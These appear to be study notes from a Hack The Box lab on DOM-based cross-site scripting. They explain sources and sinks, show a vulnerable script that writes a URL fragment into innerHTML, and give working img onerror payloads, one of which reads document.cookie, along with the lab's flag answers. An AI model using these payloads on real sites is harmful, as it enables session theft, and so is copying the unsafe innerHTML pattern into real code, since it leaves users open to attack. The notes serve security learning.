# DOM XSS

While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript.

--> JavaScript is used to change the page source through the Document Object Model (DOM).

- Check this through the Firefox Developer Tools by clicking [CTRL+I] and selecting the Network tab :
- No HTTP requests are being made.
- We see that the input parameter in the URL is using a hashtag #
- If we look at the page source by hitting [CTRL+I], we will notice that our test string is nowhere to be found

We can still view the rendered page source with the Web Inspector tool by clicking [CTRL+SHIFT+C]

## Source & Sink

Source : JavaScript object that takes the user input
Sink : function that writes the user input to a DOM Object on the page

If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack

Commonly used JavaScript functions to write to DOM objects are:
document.write()
DOM.innerHTML
DOM.outerHTML

Furthermore, some of the jQuery library functions that write to DOM objects are:
add()
after()
append()

- Check the source code of the application
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);

## DOM attack

Inspect
script.js

$(function () {
    $("#add").click(function () {
        if ($("#task").val().length > 0) {
            window.location.href = "#task=" + $("#task").val();
            var pos = document.URL.indexOf("task=");
            var task = document.URL.substring(pos + 5, document.URL.length);
            document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
        }
    });


This payload will failed because the innerHTML function does not allow the use of the <script>
<script>alert(document.cookie)</script>

We can use this payload :
<img src="" onerror=alert(window.origin)>

The above line creates a new HTML image object, which has a onerror attribute that can execute JavaScript code when the image is not found. 

## LAB

<img src="" onerror=alert(window.origin)>
<img src="" onerror=alert(document.cookie)>
cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}; HTB{pur3ly_cl13n7_51d3}
